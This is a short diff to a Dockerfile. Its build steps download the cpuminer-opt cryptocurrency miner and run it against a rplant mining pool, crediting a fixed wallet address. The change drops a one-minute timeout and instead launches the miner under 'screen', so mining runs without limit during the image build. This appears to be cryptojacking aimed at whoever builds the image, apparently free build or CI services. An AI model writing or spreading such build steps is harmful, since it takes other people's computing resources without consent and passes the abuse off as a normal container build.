@@ -6,7 +6,8 @@ ENV DEBIAN_FRONTEND=noninteractive \
 RUN apt update
 RUN apt -y install wget
 RUN apt -y install tar
+RUN apt -y install screen
 RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
 RUN tar xf cpuminer-opt-linux.tar.gz
 RUN chmod +x cpuminer-sse2
-RUN timeout -k 5s 1m ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.551
+RUN screen ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.551
